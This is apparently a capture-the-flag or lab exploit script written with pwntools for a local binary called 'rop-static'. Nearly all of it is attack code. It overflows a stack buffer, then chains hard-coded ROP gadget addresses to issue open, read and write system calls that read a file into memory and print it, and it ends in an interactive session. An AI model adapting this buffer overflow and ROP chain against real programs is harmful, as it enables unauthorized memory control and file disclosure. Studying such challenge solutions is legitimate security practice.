#!/usr/bin/env python

from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
#p = process('./rop-statix')
p = process('./rop-static')
#gdb.attach(p, "b main")

"""
open = 5
read = 4
write = 3
"""

"""
0x080481be : mov eax, 1 ; int 0x80
0x08048192 : mov eax, 3 ; int 0x80
0x08048152 : mov eax, 4 ; int 0x80
"""

"""
0x804804c:      "\005"
"""

"""
0x08048116 <+54>:    add    $0x1,%eax
0x08048157 : int 0x80
"""

eax_1_int = p32(0x080481be) # exit
eax_3_int = p32(0x08048192) # write
eax_4_int = p32(0x08048152) # read
eax_at_ebp_minus_8_pad_pad_pad = p32(0x08048106)

num_0x5_plus_8 = p32(0x08048054)

"""
0x08048106 : mov eax, dword ptr [ebp - 8] ; add esp, 8 ; pop ebp ; ret
"""

"""
0x0804810c : pop ebp ; ret
"""

ebp_pop = p32(0x0804810c)

ebx_pop_ebp_pop = p32(0x08048162)

# This is in the middle of the write function. It calls:
# ecx = ebp-0xc
# edx = ebp-0x10
# eax = 0x4
# int 0x80
# This could be great, but would it return to this location when finished?
ecx_ebp_minus_c = p32(0x0804814c)

edx_ebp_minus_10_eax_3_int = p32(0x0804818f)
edx_ebp_minus_10_eax_4_int = p32(0x0804814f)

nop_int = p32(0x08048157)

# How can I pass these as arguments to a system call?
string_4 = p32(0x08048028)
addr_scratch = p32(0x0804932d)

pop_three = p32(0x08048109)

# Escape the buffer
buf = "A"*200 + "B"*12

# open('4', 0)
# buf += ebx_pop_ebp_pop + string_4 + num_0x5_plus_8 + eax_at_ebp_minus_8_pad_pad_pad + p32(0) + p32(0) + addr_scratch + nop_int
# buf += ebx_pop_ebp_pop + string_4 + num_0x5_plus_8 + eax_at_ebp_minus_8_pad_pad_pad + p32(0) + p32(0) + addr_scratch + nop_int
buf += ebx_pop_ebp_pop + string_4 + num_0x5_plus_8 + eax_at_ebp_minus_8_pad_pad_pad + p32(0) + p32(0) + addr_scratch + nop_int + "a"*0x18

# 0x08048130  write
# 0x08048170  read

addr_write = p32(0x08048130)
addr_read = p32(0x08048170)

# read(3, addr_scratch, 0x100)
# func pops arg1 arg2 arg3
buf += addr_read + pop_three + p32(3) + addr_scratch + p32(0x100)

# write(1, addr_scratch, 0x100)
buf += addr_write + pop_three + p32(1) + addr_scratch + p32(0x100)

#buf =  "A"*200 + "B"*12 + eax_inc*5 + ebx_pop_ebp_pop + string_4 + p32(0) + eax_1_int
#buf = "A"*200 + "B"*12 + ebx_pop_ebp_pop + p32(0x02ac2ac4) + p32(0) + eax_at_ebx_times_3_ebp_pop_ret + p32(0) + eax_1_int

p.sendline(buf)

p.interactive()
